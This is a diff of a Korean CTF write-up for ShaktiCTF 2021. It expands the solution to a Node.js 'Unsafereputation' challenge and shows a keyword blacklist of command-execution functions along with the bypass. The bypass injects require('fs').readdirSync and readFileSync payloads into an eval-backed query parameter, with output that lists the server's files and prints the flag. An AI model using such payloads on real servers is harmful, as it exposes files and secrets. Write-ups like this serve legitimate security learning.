@@ -155,7 +155,9 @@ excerpt: "ShaktiCTF 2021 Writeup"
     ...
     ```
 
-    SQL Injection 페이로드를 주입해봤지만 취약점이 발생하지 않았습니다.
+    SQL Injection 페이로드를 주입해봤지만
+
+    별 효과가 있지 않았습니다.
 
     하지만 로그인할때 SQL만 쓰이는것이 아닌 NoSQL이라는것도 있기때문에
 
@@ -182,11 +184,15 @@ excerpt: "ShaktiCTF 2021 Writeup"
   + main.js
 ```
 
-+ #### 문제분석 & 문제 풀이
++ #### 문제분석
 
-    > 해당 문제는 CTF가 끝나자마자 웹 서버가 닫혀서 상세하게 못했습니다.
+    ![Home Page](/post-images/ShaktiCTF/2021/WEB/Unsafereputation/Homepage.png)
 
-    해당 문제는 ``main.js``에
+    문제의 웹 사이트에 들어가보면 이러한 텍스트가 나오게됩니다.
+
+    문제를 풀기 위해 아무리 분석해봤지만 아무것도 나오지 않았습니다.
+
+    하지만 해당 문제는 ``main.js`` 파일 소스코드를 제공하기때문에 한번 살펴보면
 
     ```js
     var express = require('express');
@@ -219,7 +225,15 @@ excerpt: "ShaktiCTF 2021 Writeup"
 
     이러한 소스코드를 사용하는것을 볼 수 있습니다.
 
-    해당 소스코드를 살펴보면
+    해당 main.js 소스코드를 분석해보면 
+    
+    URL에 ``req.query.text`` 즉 ``/?text=1`` 이러한 값을 전송하면
+
+    ![Welcome](/post-images/ShaktiCTF/2021/WEB/Unsafereputation/Welcome-text.png)
+
+    ``Welcom to the world 1`` 이런 텍스트가 출력됩니다.
+
+    그리고 우리가 입력한 값은 inp 변수에 저장되며
 
     ```js
     if(blacklist.map(v=>inp.includes(v)).filter(v=>v).length !== 0){
@@ -228,20 +242,36 @@ excerpt: "ShaktiCTF 2021 Writeup"
     }
     ```
 
-    ``['system', 'child_process', 'exec', 'spawn', 'eval']`` blacklist에 있는 문자열이 하나라도 존재하면 ``That function is blocked, sorry XD``를 반환하고
+    ``['system', 'child_process', 'exec', 'spawn', 'eval']`` blacklist에 있는 문자열이 하나라도 존재하면 
+    
+    ``That function is blocked, sorry XD``를 반환하고
 
-    만약 존재하지않으면 eval함수에 우리가 입력한 임의의 값이 전송됩니다.
+    만약 존재하지않으면 eval함수에 입력한 임의의 값이 전송되면서 eval함수의 결과를 웹 페이지에 출력하게 됩니다.
+
++ #### 문제 풀이
 
     해당 eval함수는 어떤 언어든 되게 위험한 함수로 잘 알려져 있으므로
 
-    블랙리스트 문자열을 우회하여
+    ``blacklist``변수에 있는 문자열을 우회하여 내부 서버 파일에 접근하기 위해
 
     ```js
-    require("fs").readdirSync("FILE Name")
+    require("fs").readdirSync("FILE Path")
     require("fs").readFileSync("FILE Name")
     ```
 
-    node.js에서 fs 모듈의 ``readFileSync`` ``readdirSync`` 해당 함수를 이용하여 내부 서버의 파일에 접근했습니다.
+    fs 모듈의 ``readdirSync``, ``readFileSync`` 함수를 이용하여 취약점을 발생시켰습니다.
+
+    ```js
+    /?text=require("fs").readdirSync("./")
+    Welcome to the world .bash_history,.bash_logout,.bashrc,.cache,.gnupg,.local,.pm2,.profile,.ssh,Dockerfile,hosts,main.js,node_modules,package-lock.json
+
+    /?text=require("fs").readFileSync("hosts")
+    Welcome to the world This it the flag you are looking for - shaktictf{eval_1s_n0t_safe_f0r_reputation}
+    ```
+
+    ``readdirSync``함수로 원하는 경로의 파일 이름을 알아낸 다음 ``readFileSync``함수로 파일 내용을 읽어보면
+    
+    hosts 파일에 플래그가 존재하는것을 볼 수 있습니다.
 
 ## 후기
 
